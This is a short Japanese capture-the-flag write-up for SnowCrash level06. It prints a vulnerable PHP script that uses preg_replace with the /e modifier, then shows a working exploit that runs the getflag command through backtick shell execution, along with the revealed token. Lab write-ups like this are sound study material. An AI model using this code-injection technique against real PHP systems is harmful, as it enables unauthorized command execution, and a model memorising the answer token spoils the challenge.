```sh
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
$m = preg_replace("/\./", " x ", $m);
$m = preg_replace("/@/", " y", $m);
return $m;
}
function x($y, $z) {
$a = file_get_contents($y);
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
$a = preg_replace("/\[/", "(", $a);
$a = preg_replace("/\]/", ")", $a);
return $a;
}
$r = x($argv[1], $argv[2]); print $r;
?>
```

- `preg_replace('/置換対象の文字列/', '置換後の文字列', '置換対象の文字列が含まれている部分');`
- `feile_get_contents`はfileパスを渡すとファイルの中身を文字列にして返す。

`preg_replace`の`/e`オプションはevaluate実行される。

つまり、`/(\[x (.*)\])/e`正規表現に一致する文字列が書かれたファイルを渡すことで、任意のコマンドを実行できる。

`[x 改行以外の任意の文字列 ]`と一致する文字列が記述されてるファイルを渡す。

- `${}`はテンプレート文字列みたいな扱い。中の式や変数を展開する。
- `getflag`をバッククオートで囲むとシェルコマンドとして実行する実行演算子になる。https://www.php.net/manual/ja/language.operators.execution.php

```sh
level06@SnowCrash:~$ echo '[x ${`getflag`} ]' > /tmp/hoge
level06@SnowCrash:~$ ./level06 /tmp/hoge
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```